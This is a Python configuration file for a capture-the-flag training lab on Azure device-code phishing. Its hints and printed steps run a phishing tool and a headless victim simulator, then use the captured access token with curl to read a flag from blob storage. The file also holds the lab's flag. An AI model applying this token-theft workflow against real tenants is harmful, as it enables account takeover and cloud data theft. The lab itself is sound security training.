from cumulonimbus.providers.base.application_configuration import ApplicationConfigurationAbstract


class ApplicationConfiguration(ApplicationConfigurationAbstract):
    mitre_ttps = [
        {"id": "T1528", "name": "Steal Application Access Token", "url": "https://attack.mitre.org/techniques/T1528/"},
        {"id": "T1566", "name": "Phishing", "url": "https://attack.mitre.org/techniques/T1566/"},
        {"id": "T1530", "name": "Data from Cloud Storage", "url": "https://attack.mitre.org/techniques/T1530/"},
        {"id": "T1078.004", "name": "Valid Accounts: Cloud Accounts", "url": "https://attack.mitre.org/techniques/T1078/004/"},
    ]

    def configure_application(self, **kwargs):
        pass

    def get_difficulty(self):
        return "Beginner"

    def get_hints(self):
        return {
            1: "Navigate to the lab's tools/ directory and run phish.py with your tenant domain. It initiates a device code flow and prints a realistic phishing message with the user code. Keep this terminal open — it polls for the victim's token.",
            2: "Open a second terminal on your host machine and run: docker exec -it cumulonimbus bash. Then run victim_simulator.py with the user code printed by phish.py and the victim credentials provided above. It uses a headless Chromium browser to automatically complete the device code authentication as the victim.",
            3: "Once phish.py prints 'TOKEN CAPTURED', use the saved token to read the flag: TOKEN=$(python3 -c \"import json; d=json.load(open('/tmp/dcp_token.json')); print(d['access_token'])\") && curl -H \"Authorization: Bearer $TOKEN\" -H \"x-ms-version: 2020-04-08\" \"https://<storage_account>.blob.core.windows.net/sensitive-data/flag.txt\"",
        }

    def get_flag(self):
        return "CUMULONIMBUS{D3v1c3_C0d3_Ph1sh1ng_W0rks}"

    def pretty_print_tf_output(self, app_id, output):
        if not output:
            return
        def val(key):
            return output.get(key, {}).get("value", "N/A")
        print("###############################################")
        print("#             Required Information            #")
        print("###############################################")
        print("[1] Tenant domain      : " + val("domain_name"))
        print("[2] Victim username    : " + val("user_name"))
        print("[3] Victim password    : " + val("user_password"))
        print("[4] Storage account    : " + val("storage_account_name"))
        print("[5] Container name     : " + val("container_name"))
        print("")
        print("To open a second terminal inside the container, run this on your HOST machine:")
        print("  docker exec -it cumulonimbus bash")
        print("")
        print("Step 1 — Terminal 1: run the phishing tool")
        print("  cd app/cumulonimbus/applications/azure/device_code_phishing/tools")
        print("  python3 phish.py \\")
        print("      --tenant          {} \\".format(val("domain_name")))
        print("      --victim-username {} \\".format(val("user_name")))
        print("      --victim-password '{}'".format(val("user_password")))
        print("")
        print("Step 2 — Terminal 2: copy the victim_simulator.py command printed by phish.py and run it")
        print("")
        print("Step 3 — Use the captured token to read the flag:")
        print("  TOKEN=$(python3 -c \"import json; d=json.load(open('/tmp/dcp_token.json')); print(d['access_token'])\")")
        print("  curl -s -H \"Authorization: Bearer $TOKEN\" \\")
        print("       -H \"x-ms-version: 2020-04-08\" \\")
        print("       \"https://{}.blob.core.windows.net/{}/flag.txt\"".format(
            val("storage_account_name"), val("container_name")))
        self.print_mitre_ttps()
